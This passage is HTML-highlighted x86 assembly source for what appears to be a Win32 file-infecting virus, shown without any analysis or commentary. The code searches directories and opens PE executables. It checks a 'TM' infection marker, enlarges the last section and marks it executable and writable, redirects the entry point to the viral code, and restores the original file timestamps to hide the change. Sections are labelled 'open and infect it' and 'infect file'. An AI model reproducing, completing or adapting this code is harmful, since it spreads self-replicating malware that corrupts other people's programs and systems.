          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_crtDir</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
          </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">          </span><span class="sc6">std</span><span class="sc0">
          </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">':'</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@done</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@nextDir</span><span class="sc0">

</span><span class="sc5">@done</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">@nextDir1</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
          </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">          </span><span class="sc6">stosb</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@nextDir1</span><span class="sc0">

          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_XSetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@cAPI</span><span class="sc0">
            
          
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------( open and infect it )-----------------------</span><span class="sc0">
</span><span class="sc5">@tryInfect</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileSearch.FileName</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_XSetFileAttributes</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@cAPI</span><span class="sc0">

          </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@eouTotal</span><span class="sc0">

          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;open file</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0"> 
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_XCreateFile</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@cAPI</span><span class="sc0">
          
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@eou1</span><span class="sc0">
          </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;save time</span><span class="sc0">
          
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileSearch.FileSizeLow</span><span class="sc4">]</span><span class="sc0"> 
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_newFileSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01000h</span><span class="sc0">
          
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;create map</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileHandle</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_XCreateFileMapping</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@cAPI</span><span class="sc0">

          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@eou2</span><span class="sc0">
          </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
     
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_mapHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_XMapViewOfFile</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@cAPI</span><span class="sc0">
          
          </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@eou3</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_mapBase</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@fail</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">038h</span><span class="sc4">],</span><span class="sc12">'TM'</span><span class="sc0">          </span><span class="sc1">;mark of infect</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@fail</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@fail</span><span class="sc0">

          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@infectFile</span><span class="sc0">
          
</span><span class="sc5">@fail</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_mapBase</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_XUnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@cAPI</span><span class="sc0">

</span><span class="sc5">@eou3</span><span class="sc4">:</span><span class="sc0">          
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_mapHandle</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;close map</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_XCloseHandle</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@cAPI</span><span class="sc0">
          
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileSearch.CreationTime</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileHandle</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_XSetFileTime</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@cAPI</span><span class="sc0">

          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;set new filesize</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_newFileSize</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileHandle</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_XSetFilePointer</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@cAPI</span><span class="sc0">

          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileHandle</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_XSetEndOfFile</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@cAPI</span><span class="sc0">

</span><span class="sc5">@eou2</span><span class="sc4">:</span><span class="sc0">                    
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileHandle</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_XCloseHandle</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@cAPI</span><span class="sc0">

</span><span class="sc5">@eou1</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileSearch.FileAttributes</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileSearch.FileName</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_XSetFileAttributes</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@cAPI</span><span class="sc0">

</span><span class="sc5">@eouTotal</span><span class="sc4">:</span><span class="sc0">          
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;------------------------------------------( infect file )----------------</span><span class="sc0">
</span><span class="sc5">_fileAlign</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_secAlign</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">@infectFile</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                   </span><span class="sc1">;ebx - MZ, esi - PE</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">038h</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_secAlign</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileAlign</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc0">
          </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">078h</span><span class="sc0">                  </span><span class="sc1">;edi - last sec's header</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;set new physical size </span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_vSize</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileAlign</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_newFileSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

          </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">024h</span><span class="sc4">],</span><span class="sc2">0a0000020h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_xorOffs</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">028h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">034h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;host ip</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_hostIP</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                                        
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_xorOffs</span><span class="sc4">],</span><span class="sc5">_hSize</span><span class="sc0">   </span><span class="sc1">;xored offset</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">034h</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_xorOffs</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_secAlign</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">014h</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">@start</span><span class="sc4">]</span><span class="sc0">

          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@setHeader</span><span class="sc0">                         </span><span class="sc1">;ok - dont laught...</span><span class="sc0">
        
